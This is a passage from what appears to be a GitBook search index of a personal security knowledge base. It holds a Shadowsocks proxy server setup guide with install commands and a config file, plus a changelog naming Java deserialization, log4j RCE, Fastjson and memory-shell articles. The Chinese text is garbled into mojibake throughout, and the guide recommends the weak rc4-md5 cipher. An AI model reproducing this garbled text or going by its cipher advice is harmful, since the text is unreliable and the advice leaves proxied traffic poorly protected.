Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:02 "},"ä¸ªäººçŸ¥è¯†åº“/03.æš‚æœªåˆ†ç±»/01.ä»£ç†ç±»/Linuxä¸‹æ­å»ºShadowSocksæœåŠ¡å™¨.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/03.æš‚æœªåˆ†ç±»/01.ä»£ç†ç±»/Linuxä¸‹æ­å»ºShadowSocksæœåŠ¡å™¨.html","title":"Linuxä¸‹æ­å»ºShadowSocksæœåŠ¡å™¨","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å®‰è£…SSæœåŠ¡ç«¯ CentOS Debian/Ubuntu é…ç½®ShadowSocks å¯åŠ¨ShadowsocksæœåŠ¡ç«¯ å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯ é…ç½® æˆåŠŸæˆªå›¾ å…¶ä»– ç–‘éš¾æ‚ç—‡ åŒç±»äº§å“ å®‰è£…SSæœåŠ¡ç«¯ CentOS æ‰§è¡Œå‘½ä»¤ # å®‰è£… python setup tools yum install python-setuptools -y #å®‰è£…pip easy_install pip #å‡çº§ pip pip install â€“upgrade pip #å®‰è£… shadowsocks pip install shadowsocks å•ç‹¬æ±‡æ€»ä¸€ä¸‹ï¼Œæ–¹ä¾¿ç›´æ¥å¤åˆ¶ç²˜è´´ yum install python-setuptools -y easy_install pip pip install â€“upgrade pip pip install shadowsocks Debian/Ubuntu apt-get install python-pip # å›½å†…æºéƒ½åˆ äº† pip install shadowsocks -i https://pypi.python.org/simple/ æœ‰æ—¶ Ubuntu ä¼šé‡åˆ°ç¬¬ä¸€ä¸ªå‘½ä»¤å®‰è£… python-pip æ—¶æ‰¾ä¸åˆ°åŒ…çš„æƒ…å†µã€‚pip å®˜æ–¹ç»™å‡ºäº†ä¸€ä¸ªå®‰è£…è„šæœ¬ï¼Œå¯ä»¥è‡ªåŠ¨å®‰è£… pipã€‚å…ˆä¸‹è½½è„šæœ¬ï¼Œç„¶åæ‰§è¡Œå³å¯ï¼š wget https://bootstrap.pypa.io/get-pip.py python get-pip.py é…ç½®ShadowSocks åˆ›å»ºé…ç½®æ–‡ä»¶ vi /etc/shadowsocks.json ç„¶åè¾“å…¥å¦‚ä¸‹å†…å®¹ { \"server\":\"0.0.0.0\", \"server_port\":10010, \"password\":\"your_password\", \"timeout\":300, \"method\":\"rc4-md5\", \"fast_open\":true, \"workers\": 1 } ä»£ç ä¸­å„å­—æ®µçš„å«ä¹‰ å­—æ®µ è¯´æ˜ server æœåŠ¡å™¨ IPåœ°å€ (IPv4/IPv6) server_port æœåŠ¡å™¨ç›‘å¬çš„ç«¯å£ï¼Œä¸€èˆ¬è®¾ä¸º80ï¼Œ443ç­‰ï¼Œæ³¨æ„ä¸è¦è®¾ä¸ºä½¿ç”¨ä¸­çš„ç«¯å£ password è®¾ç½®å¯†ç ï¼Œè‡ªå®šä¹‰ timeout è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ method åŠ å¯†æ–¹æ³•ï¼Œå¯é€‰æ‹© â€œaes-256-cfbâ€,â€œrc4-md5â€ç­‰ç­‰ã€‚æ¨èä½¿ç”¨ â€œrc4-md5â€ fast_open true æˆ– falseã€‚å¦‚æœä½ çš„æœåŠ¡å™¨ Linux å†…æ ¸åœ¨3.7+ï¼Œå¯ä»¥å¼€å¯ fast_open ä»¥é™ä½å»¶è¿Ÿã€‚ workers workersæ•°é‡ï¼Œé»˜è®¤ä¸º 1ã€‚ å¯åŠ¨ShadowsocksæœåŠ¡ç«¯ ssserver -c /etc/shadowsocks.json screen -dmS ssserver ssserver -c /etc/shadowsocks.json å¯åŠ¨å¯èƒ½ä¼šå‡ºç°é”™è¯¯AttributeError: /lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup è¿™æ˜¯ç”±äºåœ¨openssl 1.1.0ä¸­åºŸå¼ƒäº† EVP_CIPHER_CTX_cleanup() å‡½æ•°è€Œå¼•å…¥äº† EVE_CIPHER_CTX_reset() å‡½æ•°æ‰€å¯¼è‡´çš„ è§£å†³æ–¹æ¡ˆï¼šhttps://floperry.github.io/2019/02/24/2018-06-25-Ubuntu-18.04-%E4%B8%8B%E8%A7%A3%E5%86%B3-shadowsocks-%E6%9C%8D%E5%8A%A1%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/ 1ã€å®šä½é”™è¯¯æ–‡ä»¶ 2ã€ä¿®æ”¹é”™è¯¯æ–‡ä»¶ vim /usr/local/lib/python3.8/dist-packages/shadowsocks/crypto/openssl.py 3ã€æœç´¢ cleanup å¹¶å°†å…¶æ›¿æ¢ä¸º reset 4ã€å†æ¬¡å¯åŠ¨ï¼Œå‡ºç°å¦‚ä¸‹å†…å®¹è¯´æ˜æˆåŠŸ å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯ é…ç½® æˆåŠŸæˆªå›¾ å…¶ä»– ç–‘éš¾æ‚ç—‡ å¯åŠ¨åå‘ç°å®¢æˆ·ç«¯è¿æ¥ä¸ä¸Šçš„æƒ…å†µï¼Œå¯èƒ½æ˜¯å› ä¸ºæœåŠ¡å™¨ä¾›åº”å•†çš„å®‰å…¨ç­–ç•¥ï¼Œæœ‰2ç§è§£å†³æ–¹æ¡ˆï¼š ä¸Šä¾›åº”å•†çš„å¹³å°å»å¼€å¯å®‰å…¨ç­–ç•¥ï¼Œå…è®¸éæ­£å¸¸ç«¯å£è®¿é—® æ›¿æ¢ä¸ºå…¶ä»–çš„ç«¯å£ï¼Œå¦‚80ã€8080ç­‰é»˜è®¤å…è®¸è®¿é—®çš„ç«¯å£ åŒç±»äº§å“ goè¯­è¨€shadowsocksï¼šhttps://github.com/shadowsocks/go-shadowsocks2 Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-27 10:03:25 "},"æ›´æ–°æ—¥å¿—.html":{"url":"æ›´æ–°æ—¥å¿—.html","title":"æ›´æ–°æ—¥å¿—","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 2021å¹´12æœˆ 2021å¹´12æœˆ18æ—¥ 2021å¹´12æœˆ25æ—¥ 2021å¹´12æœˆ27æ—¥ ä¸ªäººçŸ¥è¯†åº“/(.*?)\\.md$ * [$1](ä¸ªäººçŸ¥è¯†åº“/$1.html) 2021å¹´12æœˆ 2021å¹´12æœˆ18æ—¥ çŸ¥è¯†æ¡†æ¶æ­å»º 2021å¹´12æœˆ25æ—¥ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/01.JVMç±»åŠ è½½æœºåˆ¶ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/02.Javaåå°„æœºåˆ¶ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/03.Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ– 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/04.RMIåŸºç¡€ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/05.JNDIæ³¨å…¥ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/06.IDEAæ–­ç‚¹è°ƒè¯• 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/07.JavaåŠ è½½å­—èŠ‚ç  02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/08.javassistå­—èŠ‚ç ç¼–ç¨‹ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/09.ELè¡¨è¾¾å¼ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/10.SpELè¡¨è¾¾å¼ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/11.OGNLè¡¨è¾¾å¼ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/12.IDEAè°ƒè¯•JAR 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/09.log4j2_rceåˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/01.Apache_Commons_Collectionsä¸­çš„ååºåˆ—åŒ– 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/02.URLDNSé“¾åˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/03.log4jååºåˆ—åŒ–æ¼æ´åˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/04.Fastjson 1.2.24ååºåˆ—åŒ–æ¼æ´åˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/05.Fastjsonçš„dnslogæ¢æµ‹æ–¹å¼åˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/06.Fastjsonå„ç‰ˆæœ¬æ¼æ´åˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/07.Fastjson1.2.68åˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/08.ysoserial-C3P0åˆ†æ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/01.Tomcatå†…å­˜é©¬ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/02.Springå†…å­˜é©¬ 02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/3.å†…å­˜é©¬/03.Java Agent å†…å­˜é©¬ 2021å¹´12æœˆ27æ—¥ 03.æš‚æœªåˆ†ç±»/01.ä»£ç†ç±»/Linuxä¸‹æ­å»ºShadowSocksæœåŠ¡å™¨ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-27 10:01:49 "},"å‹æƒ…é“¾æ¥.html":{"url":"å‹æƒ…é“¾æ¥.html","title":"å‹æƒ…é“¾æ¥","keywords":"","body":"TEST ... Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-18 20:20:11 "}}